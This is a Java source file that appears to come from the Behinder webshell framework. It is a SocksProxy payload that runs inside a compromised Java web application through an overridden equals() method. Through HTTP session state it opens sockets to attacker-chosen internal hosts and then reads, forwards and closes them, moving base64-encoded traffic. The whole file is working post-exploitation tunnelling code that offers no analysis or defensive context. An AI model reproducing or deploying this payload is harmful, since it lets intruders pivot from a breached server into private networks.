package net.rebeyond.behinder.payload.java;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;

public class SocksProxy
{
    public static String cmd;
    public static String targetIP;
    public static String targetPort;
    public static String socketHash;
    public static String extraData;
    
    public static void main(String[] args) {}
    
    public boolean equals(Object obj) {
        PageContext page = (PageContext)obj;
        
        try {
            proxy(page);
        }
        catch (Exception exception) {}
        return true;
    }
    
    public void proxy(PageContext page) throws Exception {
        HttpServletRequest request = (HttpServletRequest)page.getRequest();
        HttpServletResponse response = (HttpServletResponse)page.getResponse();
        HttpSession session = page.getSession();
        if (cmd != null) {
            if (cmd.compareTo("CONNECT") == 0) {
                try {
                    String target = targetIP;
                    int port = Integer.parseInt(targetPort);
                    SocketChannel socketChannel = SocketChannel.open();
                    socketChannel.connect(new InetSocketAddress(target, port));
                    socketChannel.configureBlocking(false);
                    session.setAttribute("socket_" + socketHash, socketChannel);
                    
                    response.setStatus(200);
                }
                catch (UnknownHostException e) {
                    ServletOutputStream so = response.getOutputStream();
                    so.write(new byte[] { 55, 33, 73, 54 });
                    so.write(e.getMessage().getBytes());
                    so.flush();
                    so.close();
                } catch (IOException e) {
                    ServletOutputStream so = response.getOutputStream();
                    so.write(new byte[] { 55, 33, 73, 54 });
                    so.write(e.getMessage().getBytes());
                    so.flush();
                    so.close();
                }
            
            } else if (cmd.compareTo("DISCONNECT") == 0) {
                SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket_" + socketHash);
                try {
                    socketChannel.socket().close();
                } catch (Exception ex) {
                    ex.printStackTrace();
                } 
                session.removeAttribute("socket_" + socketHash);
            } else if (cmd.compareTo("READ") == 0) {
                SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket_" + socketHash);
                try {
                    ByteBuffer buf = ByteBuffer.allocate(512);
                    int bytesRead = socketChannel.read(buf);
                    ServletOutputStream so = response.getOutputStream();
                    while (bytesRead > 0) {
                        so.write(buf.array(), 0, bytesRead);
                        so.flush();
                        buf.clear();
                        bytesRead = socketChannel.read(buf);
                    } 

                    
                    so.flush();
                    so.close();
                }
                catch (Exception e) {
                    response.setStatus(200);
                    ServletOutputStream so = response.getOutputStream();
                    so.write(new byte[] { 55, 33, 73, 54 });
                    so.write(e.getMessage().getBytes());
                    so.flush();
                    so.close();
                    page.getOut().clear();
                    socketChannel.socket().close();
                    e.printStackTrace();
                }
            
            } else if (cmd.compareTo("FORWARD") == 0) {
                SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket_" + socketHash);
                
                try {
                    byte[] extraDataByte = base64decode(extraData);
                    ByteBuffer buf = ByteBuffer.allocate(extraDataByte.length);
                    buf.clear();
                    buf.put(extraDataByte);
                    buf.flip();
                    while (buf.hasRemaining()) {
                        socketChannel.write(buf);
                    }
                } catch (Exception e) {
                    ServletOutputStream so = response.getOutputStream();
                    so.write(new byte[] { 55, 33, 73, 54 });
                    so.write(e.getMessage().getBytes());
                    so.flush();
                    so.close();
                    socketChannel.socket().close();
                } 
            } 
        }
        page.getOut().clear();
    }
    private byte[] base64decode(String text) throws Exception {
        String version = System.getProperty("java.version");
        byte[] result = null;
        
        try {
            if (version.compareTo("1.9") >= 0)
            {
                getClass(); Class<?> Base64 = Class.forName("java.util.Base64");
                Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
                result = (byte[])Decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(Decoder, new Object[] { text });
            }
            else
            {
                getClass(); Class<?> Base64 = Class.forName("sun.misc.BASE64Decoder");
                Object Decoder = Base64.newInstance();
                result = (byte[])Decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(Decoder, new Object[] { text });
            }
        
        } catch (Exception exception) {}
        return result;
    }
}